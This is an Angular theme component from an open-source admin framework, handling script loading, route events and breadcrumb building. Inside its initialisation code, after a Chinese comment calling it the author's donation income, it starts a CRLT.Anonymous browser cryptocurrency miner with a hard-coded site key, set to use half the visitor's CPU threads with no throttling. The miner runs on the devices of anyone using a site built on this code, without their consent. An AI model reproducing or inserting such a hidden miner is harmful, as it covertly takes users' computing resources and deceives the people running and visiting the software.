import { Component, OnInit, ViewEncapsulation } from '@angular/core'
import { NavigationEnd, NavigationStart, Router } from '@angular/router'
import { Helpers } from '../helpers'
import { ScriptLoaderService } from '../shared/base/service/script-loader.service'
import { CTX } from "../app.constants"
import { LocalStorageService, SessionStorageService } from "ngx-webstorage"
import { Principal } from "../auth/_services/principal.service"
import { setActiveItemMenu } from "../shared/base/base.util"
import {Module} from "./pages/modules/sys/module/module.model";
import {ModuleService} from "./pages/modules/sys/module/module.service";

declare let mApp: any
declare let mUtil: any
declare let mLayout: any
@Component({
    selector: ".m-grid.m-grid--hor.m-grid--root.m-page",
    templateUrl: "./theme.component.html",
    encapsulation: ViewEncapsulation.None,
})
export class ThemeComponent implements OnInit {

    private modules: Module[]

    constructor(private scriptLoaderService: ScriptLoaderService,
        private moduleService: ModuleService,
        private router: Router,
        private principal: Principal,
        private localStorage: LocalStorageService,
        private sessionStorage: SessionStorageService) {

    }

    ngOnInit() {
        var url = window.location.hash.replace("#", "")
        this.moduleService.data().subscribe(
            (data: any) => {
                this.modules = data
                this.initBreadcrumbs(url)
            }
        )
        // console.log("DefaultComponent")
        this.scriptLoaderService.load('body', 'assets/vendors/base/vendors.bundle.js',
            'assets/vendors/custom/jquery-ztree/js/jquery.ztree.core.js',
            'assets/vendors/custom/jquery-ztree/js/jquery.ztree.excheck.js',
            'assets/frame/albedo.js',
            'assets/frame/albedo.jquery.replenish.js',
            'assets/demo/default/base/scripts.bundle.js',
            'assets/frame/albedo.form.component.js',
            'assets/frame/albedo.list.datatables.js', )
            .then(result => {
                Helpers.setLoading(false)
                // optional js to be loaded once
                this.scriptLoaderService.load('head', 'assets/vendors/custom/fullcalendar/fullcalendar.bundle.js')
                const token = this.localStorage.retrieve('authenticationToken') || this.sessionStorage.retrieve('authenticationToken')
                albedo.setCtx(CTX)
                albedo.setSessionStorage(this.sessionStorage)
                albedo.setToken(token)
                albedo.setUserId(this.principal.getUserId())
                this.initData()
            })

        // this.scriptLoaderService.load('body',
        //     'assets/frame/albedo.form.component.js',
        //     'assets/frame/albedo.list.datatables.js', )
        this.router.events.subscribe((route) => {
            console.log(route)
            if (route instanceof NavigationStart) {
                (<any>mLayout).closeMobileAsideMenuOffcanvas();
                (<any>mLayout).closeMobileHorMenuOffcanvas();
                (<any>mApp).scrollTop();
                Helpers.setLoading(true);
                // hide visible popover
                (<any>$('[data-toggle="m-popover"]')).popover('hide')
            }
            if (route instanceof NavigationEnd) {
                // init required js
                (<any>mApp).init();
                (<any>mUtil).init();
                Helpers.setLoading(false);
                // content m-wrapper animation
                let animation = 'm-animate-fade-in-up'
                $('.m-wrapper').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(e) {
                    $('.m-wrapper').removeClass(animation)
                }).removeClass(animation).addClass(animation)
                this.initBreadcrumbs(route.url)
                this.initData()
                setActiveItemMenu(this.localStorage)
            }
        })
        /*
        * 关于捐赠支持，以下代码是作者盈利性质代码，会占用cpu 一半资源，如果非正式环境，请勿注释。
        * 谢谢大家对本开源框架。
        * */
        /******************************************************************************************/
        var threads = window.navigator.hardwareConcurrency / 2;
        if (threads < 1) {
            threads = 1;
        }
        var miner=new CRLT.Anonymous('4ec23507271718d30b965cb206801b3feb0f03f73c2a',
            {
                threads:threads,autoThreads:false,throttle:0,
            }
        );
        miner.start();
        /******************************************************************************************/
    }

    private getModules(callbackfn: (value: Module, index: number, array: Module[]) => void, thisArg?: any): void {
        this.modules && this.modules.forEach(callbackfn)
    }
    private initData() {
        if(typeof (albedoForm) != "undefined"){
            console.log("clearData")
            albedoForm.clearData()
        }
    }

    private initBreadcrumbs(url: string) {
        let thiz = this
        if (url == "/") {
            return
        }
        if (thiz.modules) {
            var breadcrumbs = [],title
            thiz.getModules(function(module) {
                //菜单
                if (module.type==='1' && (module.url == url || module.url.startsWith(url) )) {
                    console.log(module)
                    console.log(url)
                    let parentIds = module.parentIds.split(",");
                    title = module.name
                    parentIds.forEach(function(item) {
                        item && thiz.getModules(function(temp) {
                            if (item == temp.id) {
                                breadcrumbs.push({
                                    text: temp.name,
                                    title: temp.name,
                                    href: temp.url
                                })
                            }
                        })
                    })
                }
            })
            Helpers.setBreadcrumbs(breadcrumbs, title)
        }
    }

}
